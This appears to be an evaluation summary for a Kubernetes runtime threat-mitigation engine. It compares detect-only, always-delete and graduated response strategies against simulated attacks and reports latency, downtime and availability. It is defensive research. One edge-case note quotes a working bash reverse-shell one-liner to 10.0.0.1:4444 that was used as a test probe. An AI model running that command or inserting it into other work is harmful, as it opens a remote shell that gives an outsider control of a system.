# RTM Evaluation Summary (Phase 5)

This document summarizes the empirical evaluation of the Runtime Threat Mitigation (RTM) engine comparing three response strategies across four attack scenarios.

---

## 1. Median Metrics per Strategy x Scenario

Evaluated on `rtm-k8s-cluster` (Kubernetes v1.31, kindnet v20241108, Falco modern_ebpf) with $n=2$ runs per cell:

| Strategy | Scenario | First Action | Enforcement Action | Final Contained | Median Det (s) | Median Alert->Action (s) | Median Recv->Action (s) | Median Downtime (s) | Median Avail (%) |
|---|---|---|---|---|---|---|---|---|---|
| `detect_only` | E1 (shell spawn) | `alert_only` | `-` | `open` | 0.732 | - | - | 0.0 | 100.0 |
| `detect_only` | E2 (token read) | `alert_only` | `-` | `open` | 0.657 | - | - | 0.0 | 100.0 |
| `detect_only` | E3 (tmp binary) | `alert_only` | `-` | `open` | 0.562 | - | - | 0.0 | 100.0 |
| `detect_only` | E4 (reverse shell) | `alert_only` | `-` | `open` | 0.654 | - | - | 0.0 | 100.0 |
| `always_delete` | E1 (shell spawn) | `kill_pod` | `kill_pod` | `deleted` | 0.891 | 0.084 | 0.035 | 8.8 | 70.1 |
| `always_delete` | E2 (token read) | `kill_pod` | `kill_pod` | `deleted` | 0.474 | 0.001 | 0.030 | 8.2 | 70.5 |
| `always_delete` | E3 (tmp binary) | `kill_pod` | `kill_pod` | `deleted` | 0.544 | 0.001 | 0.030 | 9.2 | 67.3 |
| `always_delete` | E4 (reverse shell) | `kill_pod/none`* | `kill_pod` | `deleted/open` | 0.510 | 0.001 | 0.020 | 4.2 | 85.6 |
| `graduated` | E1 (shell spawn) | `alert_only` | `-` | `open` | 1.312 | - | - | 0.0 | 100.0 |
| `graduated` | E2 (token read) | `alert_only` | `isolate_network` | `egress_blocked` | 0.509 | 0.001 | 0.025 | 0.0 | 100.0 |
| `graduated` | E3 (tmp binary) | `alert_only` | `kill_pod` | `deleted` | 2.690 | 0.004 | 0.040 | 8.8 | 71.1 |
| `graduated` | E4 (reverse shell) | `alert_only` | `isolate_network`* | `deleted` | 0.561 | 0.001 | 0.030 | 8.2 | 75.3 |

*\*Notes on Observed Edge Cases*:
- *In `always_delete` E4 run 2, the attack command terminated before an alert was ingested by the controller, leaving the pod unmitigated (`contained=open`).*
- *In `graduated` E4, `bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'` generated `RTM-001` (`alert_only`), then `RTM-006` public egress (`isolate_network`), and immediately escalated via `RTM-007` (`kill_pod`), terminating the pod (`deleted`). The first non-alert action recorded was `isolate_network`.*

---

## 2. Reading of Results

1. **Graduated strategy preserved availability on low/medium threats**: In E1 and E2, `graduated` maintained 100.0% availability with 0.0s downtime, whereas `always_delete` suffered ~8.2–8.8s downtime (dropping availability to ~70.1–70.5%).
2. **Deterministic isolation without service interruption**: For E2 (token read), `graduated` logged `enforcement_action=isolate_network` and successfully enforced egress lockdown (`egress_blocked`) while leaving inbound service availability at 100.0%.
3. **Always-delete is an unguided disruption hammer**: Deleting the pod on every alert guarantees containment for all triggered scenarios, but imposes an ~8–9s downtime penalty across benign or observational events (E1/E2).
4. **Detect-only provides zero mitigation**: Across all four attack scenarios, `detect_only` left the victim pod completely `open` with 0% containment.
5. **Controller overhead is negligible (~20–40ms)**: Measuring `received_to_action_s` on the controller's internal clock shows that once an alert arrives via webhook, evaluation and Kubernetes mutation complete in 20–40ms.

---

## 3. Evaluation Limitations

- **Sample Size**: Small sample size ($n=2$ per cell) designed for validation rather than high statistical power.
- **Single Replica / Single Victim Pod**: Testing targeted a single victim deployment replica; multi-replica load distribution was not evaluated.
- **Synthetic Attack Probes**: Attack vectors were simulated directly via `kubectl exec` CLI invocations rather than realistic multi-stage network exploit chains.
- **Probe Resolution**: Service availability was sampled at 0.5-second intervals via `curlimages/curl` loop, giving a $\pm 0.5\text{s}$ measurement discretization on downtime.
- **Clock Differences**: `alert_to_action_s` spans Falco daemon and controller clocks, whereas `received_to_action_s` measures controller-internal latency.
